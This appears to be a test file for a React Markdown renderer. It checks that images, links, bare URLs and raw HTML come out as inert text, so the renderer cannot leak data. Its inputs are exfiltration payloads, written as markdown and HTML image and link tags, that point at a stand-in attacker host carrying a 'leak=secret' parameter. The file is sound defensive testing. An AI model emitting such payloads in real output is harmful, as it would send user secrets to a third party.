import { describe, expect, test } from "bun:test";
import { renderToStaticMarkup } from "react-dom/server";
import { Markdown } from "./markdown";

function render(text: string): string {
  return renderToStaticMarkup(<Markdown text={text} />);
}

describe("Markdown egress", () => {
  test("an image renders as text, never as a fetchable element", () => {
    const html = render("![a figure](https://attacker.example/?leak=secret)");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
    expect(html).toContain("[image: a figure]");
  });

  test("a link renders as its text, without the destination", () => {
    const html = render(
      "see [the paper](https://attacker.example/?leak=secret)",
    );
    expect(html).not.toContain("href");
    expect(html).not.toContain("attacker.example");
    expect(html).toContain("the paper");
  });

  test("an autolinked bare URL is not clickable", () => {
    const html = render("see https://attacker.example/?leak=secret for detail");
    expect(html).not.toContain("href");
  });

  // The cases above pin the markdown-syntax vectors. Raw HTML is the other half
  // of the invariant: it is escaped to text rather than parsed, so `img` and `a`
  // stay the only elements in the reachable grammar. Enabling HTML — adding
  // `rehype-raw`, say — would break that without touching a case above.
  test("a raw HTML image is escaped, never a fetchable element", () => {
    const html = render('<img src="https://attacker.example/?leak=secret">');
    expect(html).not.toContain("<img");
    expect(html).toContain("&lt;img");
  });

  test("a raw HTML anchor is escaped, never clickable", () => {
    const html = render('<a href="https://attacker.example/">the paper</a>');
    expect(html).not.toContain("<a ");
    expect(html).toContain("&lt;a ");
  });

  test("prose still renders through the full grammar", () => {
    const html = render("## Finding\n\n| a | b |\n| - | - |\n| 1 | 2 |\n");
    expect(html).toContain("<h2");
    expect(html).toContain("<thead");
    expect(html).toContain("<tbody");
  });
});
